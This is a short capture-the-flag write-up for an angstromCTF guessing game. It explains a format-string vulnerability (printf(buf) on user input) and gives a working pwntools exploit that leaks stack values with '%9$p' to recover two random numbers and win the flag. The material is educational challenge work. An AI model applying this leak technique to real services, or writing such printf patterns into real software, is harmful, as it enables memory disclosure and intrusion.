### Solved by superkojiman

This challenge prompts us to guess the sum of two randomly generated values. The source code and binary are provided. Here's the important part of the code:

```
    srand(time(NULL));
    int rand1 = rand() % 1000000;
    int rand2 = rand() % 1000000;

    printf(buf);
    fflush(stdout);
    int guess;
    char num[8];
    fgets(num,8,stdin);
    sscanf(num,"%d",&guess);

    if (guess == rand1+rand2){
        printf("Congrats, here's a flag: %s\n", flag);
```

The vulnerability is in the call to `printf(buf)` right after the `rand()` is called. It allows us to leak variables on the stack using format strings. 

```
# ./guessPublic64
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max):
%p.%p.%p.%p.%p.%p.%p.%p.%p
I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
0x7fffffffe2ec.0x53f.0xc0214.0x7ffff7dd10a4.0x7ffff7dd1120.0x7fffffffe428.0x100000000.0x400a50.0xc02140001d486's guess: 1234
Sorry, the answer was 906906. Try again :(
```

After analyzing the binary's behaviour in gdb, I realized that the 9th index in the stack leak contained the two randomly generated numbers. In the above, that would be 0xc02140001d486. Since we can leak the two randomly generated numbers, we can input the correct sum when prompted. 

Here's a working exploit:

```
#!/usr/bin/env python
from pwn import *
r = remote("shell.angstromctf.com", 1235)
print r.recv()

r.sendline("%9$p")
d =r.recv().split()
d = d[-2]
d = d[:-2]
print "leak:", d

n = int(d, 16)

x = n >> 32
y = n & 0xfffff

print "x =", hex(x)
print "y =", hex(y)
print "sum {0} + {1} = {2}".format(x, y, x+y)

r.sendline(str(x + y))
print r.recv()
```

And here it is in action printing out the flag: 

```
# ./sploit.py
[+] Opening connection to shell.angstromctf.com on port 1235: Done
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max):

    leak: 0xdf0e8000169df
    x = 0xdf0e8
    y = 0x169df
    sum 913640 + 92639 = 1006279
    Congrats, here's a flag: actf{format_stringz_are_pre77y_sc4ry}

    [*] Closed connection to shell.angstromctf.com port 1235
```
